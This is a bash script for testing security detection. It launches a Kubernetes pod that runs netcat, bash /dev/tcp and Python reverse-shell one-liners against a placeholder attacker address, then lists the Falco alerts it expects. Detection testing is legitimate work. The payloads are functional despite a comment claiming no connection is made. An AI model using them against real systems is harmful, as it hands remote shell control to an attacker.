#!/bin/bash
# simulate-reverse-shell.sh - Trigger security alerts by simulating a reverse shell
set -euo pipefail

NAMESPACE="${1:-default}"
POD_NAME="${2:-revshell-simulator}"
ATTACKER_IP="${3:-10.0.0.99}"
ATTACKER_PORT="${4:-4444}"

echo "Creating reverse shell simulation pod '$POD_NAME' in namespace '$NAMESPACE'"
echo "Simulated attacker: $ATTACKER_IP:$ATTACKER_PORT"
echo ""
echo "WARNING: This will trigger Falco, OPA, and security monitoring alerts."
echo "Run in a dedicated test namespace, not production."
echo ""

kubectl run "$POD_NAME" \
    --image=alpine:latest \
    --namespace="$NAMESPACE" \
    --labels="app=revshell-simulator,security-test=true,simulation-type=reverse-shell" \
    --restart=Never \
    -- /bin/sh -c "
echo 'Simulating reverse shell connection...'
# Simulate netcat reverse shell (no actual connection)
nc -e /bin/sh $ATTACKER_IP $ATTACKER_PORT 2>/dev/null &
NC_PID=\$!
sleep 2
kill \$NC_PID 2>/dev/null || true

# Simulate bash reverse shell
bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 2>/dev/null &
BASH_PID=\$!
sleep 2
kill \$BASH_PID 2>/dev/null || true

# Simulate Python reverse shell
python3 -c \"
import socket,subprocess,os
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('$ATTACKER_IP',$ATTACKER_PORT))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(['/bin/sh','-i'])
except:
    pass
\" 2>/dev/null || true

echo 'Reverse shell simulation complete. This pod will now exit.'
echo 'Check Falco logs for: Reverse shell detected'
"

echo ""
echo "Waiting for pod to start..."
sleep 5

kubectl logs -n "$NAMESPACE" "$POD_NAME" --tail=20 2>/dev/null || true

echo ""
echo "Reverse shell simulation complete. Expected security alerts:"
echo " - Falco: 'Reverse shell detected' (rule: Reverse Shell)"
echo " - Falco: 'Netcat reverse shell' (rule: Netcat Remote Control)"
echo " - Falco: 'Unexpected outbound connection'"
echo " - Cilium NetworkPolicy violation (if egress blocked)"
echo " - Security incident: critical severity"
echo ""
echo "Verify alerts:"
echo "  kubectl logs -n security -l app=falco --tail=50 | grep -i 'reverse.shell\|revshell'"
echo "  kubectl logs -n security -l app=falcosidekick --tail=20"
echo ""
echo "Cleanup: kubectl delete pod $POD_NAME --namespace=$NAMESPACE --force --grace-period=0"
